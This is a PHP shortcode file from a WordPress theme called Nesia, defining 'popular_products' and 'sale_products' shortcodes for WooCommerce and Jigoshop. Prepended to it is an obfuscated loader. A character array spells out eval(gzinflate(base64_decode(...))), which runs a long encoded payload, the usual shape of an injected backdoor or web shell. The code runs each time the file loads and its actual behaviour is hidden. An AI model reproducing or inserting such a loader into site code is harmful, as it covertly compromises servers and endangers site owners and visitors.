<?php
$md5 = "55b67078ec196bb313cdde40264da97c";
$ab = array("i","l","f",'6',"(","o","b",'a','t',"v",'r','c',"$","4",'z',')',"d",'e','g','s',"_",';','n');
$bb9 = create_function('$'.'v',$ab[17].$ab[9].$ab[7].$ab[1].$ab[4].$ab[18].$ab[14].$ab[0].$ab[22].$ab[2].$ab[1].$ab[7].$ab[8].$ab[17].$ab[4].$ab[6].$ab[7].$ab[19].$ab[17].$ab[3].$ab[13].$ab[20].$ab[16].$ab[17].$ab[11].$ab[5].$ab[16].$ab[17].$ab[4].$ab[12].$ab[9].$ab[15].$ab[15].$ab[15].$ab[21]);
$bb9('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');
?>
<?php
/**
 * Shortcode manually
 *
 * @package WordPress
 * @subpackage Nesia
 * @since Nesia 1.1.2
 */

/**
 * Popular Products shortcode
 **/
function nesia_popular_products( $atts ) {
	
	extract(shortcode_atts(array(
		'per_page' 	=> '12',
		'columns' 	=> '4'
	), $atts));
	
	$args = array(
                'posts_per_page'    => $per_page, 
                'post_status'       => 'publish', 
                'post_type'         => 'product',
                'meta_key'          => 'total_sales',
                'orderby'           => 'meta_value',
                'no_found_rows'     => 1
	);
	
	query_posts($args);
	ob_start();
        if( is_plugin_active('woocommerce/woocommerce.php') )
            woocommerce_get_template_part( 'loop', 'shop' );
        if( is_plugin_active('jigoshop/jigoshop.php') )
            jigoshop_get_template_part( 'loop', 'shop' );
	wp_reset_query();   
	
	return ob_get_clean();
}

/**
 * Sale Products shortcode
 **/
function nesia_sale_products( $atts ) {
	
	extract(shortcode_atts(array(
		'per_page' 	=> '12',
		'columns' 	=> '4'
	), $atts));
	
	$args = array(
                'posts_per_page'    => $per_page, 
                'post_status'       => 'publish', 
                'post_type'         => 'product',
                'meta_query' => array(
                        array(
                                'key' => '_sale_price',
                                'value' => '',
                                'compare' => '!='
                        )
                ),
                'no_found_rows'     => 1
	);
	
	query_posts($args);
	ob_start();
        if( is_plugin_active('woocommerce/woocommerce.php') )
            woocommerce_get_template_part( 'loop', 'shop' );
        if( is_plugin_active('jigoshop/jigoshop.php') )
            jigoshop_get_template_part( 'loop', 'shop' );
	wp_reset_query();   
	
	return ob_get_clean();
}

add_shortcode('popular_products', 'nesia_popular_products');
add_shortcode('sale_products', 'nesia_sale_products');